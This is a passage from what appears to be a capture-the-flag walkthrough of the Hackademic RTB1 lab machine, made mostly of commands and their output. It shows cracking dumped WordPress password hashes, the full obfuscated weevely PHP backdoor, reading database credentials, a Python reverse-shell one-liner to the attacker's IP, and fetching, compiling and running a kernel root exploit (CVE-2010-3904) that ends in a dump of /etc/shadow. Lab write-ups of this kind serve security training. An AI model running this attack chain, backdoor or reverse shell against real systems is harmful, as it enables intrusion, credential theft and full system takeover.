2,login,<blank>,0,<blank>,<blank>,<a href="http://,">http://,</a><blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,<blank>,<blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,<blank>,<blank>
3,nickname,<blank>,0,<blank>,<blank>,<a href="http://,">http://,</a><blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,<blank>,<blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,<blank>,<blank>
4,nickname,<blank>,0,<blank>,<blank>,<a href="http://,">http://,</a><blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,<blank>,<blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,<blank>,<blank>
5,nickname,<blank>,0,<blank>,<blank>,<a href="http://,">http://,</a><blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,<blank>,<blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,<blank>,<blank>
6,nickname,<blank>,0,<blank>,<blank>,<a href="http://,">http://,</a><blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,<blank>,<blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,<blank>,<blank>
{% endcodeblock %}</p>

<p>&ldquo;GeorgeMiller:q1w2e3&rdquo; has the highest privileges (user_level 10).</p>

<p>We crack the hashes:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep &ldquo;^[0-9]+&rdquo; wp_users.csv| awk -F, &lsquo;{print $10 &ldquo;:&rdquo;  $9}&rsquo;  > /tmp/wp_users.john
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john &ndash;format=raw-md5
Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
NickJames:admin
JohnSmith:PUPPIES
GeorgeMiller:q1w2e3
TonyBlack:napoleon
JasonKonnors:maxwell
MaxBucky:kernel
guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably
{% endcodeblock %}</p>

<p>We log in using GeorgeMiller&rsquo;s account and under &ldquo;Manage -> Files&rdquo; we upload the generated weevely shell:
{% codeblock lang:bash %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
[generate.php] Backdoor file &lsquo;weevely.php&rsquo; created with password &lsquo;1234&rsquo;
{% endcodeblock %}</p>

<p>{% codeblock lang:php %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat weevely.php
&lt;?php
$duiq = str_replace(&ldquo;sc&rdquo;,&ldquo;&rdquo;,&ldquo;scssctscrsc_scrsceplscasccsce&rdquo;);
$lucw=&ldquo;MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh&rdquo;;
$udtq=&ldquo;JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG&rdquo;;
$foif=&ldquo;IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30=&rdquo;;
$kvzf=&ldquo;wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs&rdquo;;
$tkjs = $duiq(&ldquo;v&rdquo;, &ldquo;&rdquo;, &ldquo;bvavsve6v4v_vdvevcvovdve&rdquo;);
$nqkm = $duiq(&ldquo;d&rdquo;,&ldquo;&rdquo;,&ldquo;dcdrdedatded_fudncdtdidodn&rdquo;);
$itsd = $nqkm(&lsquo;&rsquo;, $tkjs($duiq(&ldquo;woh&rdquo;, &ldquo;&rdquo;, $udtq.$lucw.$kvzf.$foif))); $itsd();
?>
{% endcodeblock %}</p>

<p>We connect using weevely and found out the mysql root password:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely <a href="http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php">http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php</a> 1234</p>

<p>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
<a href="ftp:x:14:50:FTP">ftp:x:14:50:FTP</a> User:/var/<a href="ftp:/sbin/nologin">ftp:/sbin/nologin</a>
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
apache:x:48:489:Apache:/var/www:/sbin/nologin
saslauth:x:495:488:&ldquo;Saslauthd user&rdquo;:/var/empty/saslauth:/sbin/nologin
mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
gdm:x:42:481::/var/lib/gdm:/sbin/nologin
p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash
{% endcodeblock %}</p>

<p>{% codeblock lang:php %}
@HackademicRTB1:/var/www/html/Hackademic_RTB1 $ cat wp-config.php
&lt;?php
// <strong> MySQL settings </strong> //
define(&lsquo;DB_NAME&rsquo;, &lsquo;wordpress&rsquo;);     // The name of the database
define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);     // Your MySQL username
define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;lz5yedns&rsquo;); // &hellip;and password
define(&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);     // 99% chance you won&rsquo;t need to change this value</p>

<p>// Change the prefix if you want to have multiple blogs in a single database.
$table_prefix  = &lsquo;wp<em>&rsquo;;   // example: &lsquo;wp</em>&rsquo; or &lsquo;b2&rsquo; or &lsquo;mylogin_&rsquo;</p>

<p>// Change this to localize WordPress.  A corresponding MO file for the
// chosen language must be installed to wp-includes/languages.
// For example, install de.mo to wp-includes/languages and set WPLANG to &lsquo;de&rsquo;
// to enable German language support.
define (&lsquo;WPLANG&rsquo;, &lsquo;&rsquo;);</p>

<p>/<em> Stop editing </em>/</p>

<p>define(&lsquo;ABSPATH&rsquo;, dirname(<strong>FILE</strong>).&lsquo;/&rsquo;);
require_once(ABSPATH.&lsquo;wp-settings.php&rsquo;);
?>
{% endcodeblock %}</p>

<p>Because our web shell doesn&rsquo;t have assigned tty, we use python to create another reverse shell:
{% codeblock lang:bash %}
@HackademicRTB1:/tmp $ sudo -l
sudo: sorry, you must have a tty to run sudo
{% endcodeblock %}</p>

<p>{% codeblock lang:python %}
root@kali32:~# nc -lp 1338</p>

<p>@HackademicRTB1:/tmp $ python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; 192.168.80.137 1338
{% endcodeblock %}</p>

<p>For privilege escalation, we use the following exploit:
{% codeblock lang:c %}
root@kali32:/usr/share/exploitdb# head platforms/linux/local/15285.c
//source: <a href="http://www.vsecurity.com/resources/advisory/20101019-1/">http://www.vsecurity.com/resources/advisory/20101019-1/</a></p>

<p>/*
 * Linux Kernel &lt;= 2.6.36-rc8 RDS privilege escalation exploit
 * CVE-2010-3904
 * by Dan Rosenberg <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#100;&#114;&#x6f;&#115;&#x65;&#110;&#98;&#101;&#114;&#103;&#64;&#x76;&#x73;&#101;&#x63;&#117;&#x72;&#x69;&#116;&#x79;&#46;&#99;&#111;&#x6d;">&#x64;&#114;&#111;&#115;&#x65;&#110;&#98;&#x65;&#114;&#x67;&#x40;&#x76;&#x73;&#x65;&#99;&#117;&#x72;&#105;&#x74;&#121;&#46;&#x63;&#x6f;&#x6d;</a>
 *
 * Copyright 2010 Virtual Security Research, LLC
 *
 * The handling functions for sending and receiving RDS messages
{% endcodeblock %}</p>

<p>{% codeblock lang:bash %}
bash-4.0$ wget &ndash;no-check-certificate <a href="https://www.exploit-db.com/download/15285">https://www.exploit-db.com/download/15285</a> -O a.c
bash-4.0$ gcc a.c
gcc a.c
bash-4.0$ ./a.out
./a.out
[<em>] Linux kernel >= 2.6.30 RDS socket exploit
[</em>] by Dan Rosenberg
[<em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[</em>] Overwriting security ops&hellip;
[<em>] Overwriting function pointer&hellip;
[</em>] Triggering payload&hellip;
[<em>] Restoring function pointer&hellip;
[</em>] Got root!
sh-4.0# id
id
uid=0(root) gid=0(root)</p>

<p>sh-4.0# cat /etc/shadow
cat /etc/shadow
root:$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
bin:<em>:14495:0:99999:7:::
daemon:</em>:14495:0:99999:7:::
adm:<em>:14495:0:99999:7:::
lp:</em>:14495:0:99999:7:::
sync:<em>:14495:0:99999:7:::
shutdown:</em>:14495:0:99999:7:::
halt:<em>:14495:0:99999:7:::
mail:</em>:14495:0:99999:7:::
uucp:<em>:14495:0:99999:7:::
operator:</em>:14495:0:99999:7:::
games:<em>:14495:0:99999:7:::
gopher:</em>:14495:0:99999:7:::
<a href="ftp:*:14495:0:99999:7:::">ftp:*:14495:0:99999:7:::</a>
nobody:*:14495:0:99999:7:::
vcsa:!!:14557::::::
avahi-autoipd:!!:14557::::::
ntp:!!:14557::::::
dbus:!!:14557::::::
rtkit:!!:14557::::::
nscd:!!:14557::::::
tcpdump:!!:14557::::::
avahi:!!:14557::::::
haldaemon:!!:14557::::::
openvpn:!!:14557::::::
apache:!!:14557::::::
saslauth:!!:14557::::::
mailnull:!!:14557::::::
smmsp:!!:14557::::::
smolt:!!:14557::::::
sshd:!!:14557::::::
pulse:!!:14557::::::
gdm:!!:14557::::::
p0wnbox.Team:$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76/:14981:0:99999:7:::
mysql:!!:14981::::::
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
